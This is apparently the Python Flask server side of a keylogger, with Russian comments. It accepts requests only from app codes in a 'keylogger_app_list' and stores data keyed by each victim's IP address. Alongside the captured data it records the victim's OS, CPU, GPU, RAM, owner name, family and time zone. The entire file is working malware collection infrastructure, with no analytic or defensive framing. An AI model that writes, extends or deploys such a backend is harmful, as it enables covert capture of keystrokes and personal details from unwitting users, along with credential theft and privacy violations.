from flask import Flask, request

import db_methods
from config import Server, App


app = Flask(__name__)
app.config['SECRET_KEY'] = Server.secret_key


@app.route('/')  # Главная страница сервера
def page_main(): 
    return Server.request_server_info


@app.route('/data/')  # Обработчик запросов к базе данных
def page_data_handler():
    args = ['action', 'app', 'ip', 'data', 'type']
    req_args = [request.args.get(arg, None) for arg in args]
    action, app, user_ip, data, data_type = req_args

    if (app is None) or (app not in App.keylogger_app_list):  # Проверка кода приложения (в целях защиты)
        return Server.request_bad_app_name

    if (action is None) or (user_ip is None) or (data is None) or (data_type is None):  # Проверка основных аргументов
        return Server.request_bad_argument

    if (action == 'create'):  # Создание нового файла ip
        check_user = db_methods.user_file_check(user_ip)

        if (check_user):  # Файл ip уже существует - ошибка
            return Server.request_ip_already_exist

        args = ['os', 'cpu', 'gpu', 'ram', 'owner', 'family', 'time_zone']
        req_args = [request.args.get(arg, None) for arg in args]
        create_file = db_methods.user_file_create(user_ip, data, data_type, *req_args)

        if (create_file):  # Файл ip успешно создан
            return Server.request_file_created_successfully

        return Server.request_failed_to_create_file  # Не удалось создать файл ip

    if (action == 'update'):  # Обновление данных уже существующего файла ip
        check_user = db_methods.user_file_check(user_ip)

        if not (check_user):  # Файла ip не сущесвует - ошибка
            return Server.request_ip_does_not_exist

        write_file = db_methods.user_file_write(user_ip, data, data_type)

        if (write_file):  # Файл ip успешно обновлен
            return Server.request_file_updated_successfully

        return Server.request_failed_to_update_file  # Не удалось обновить файл ip


app.run(port='8080')
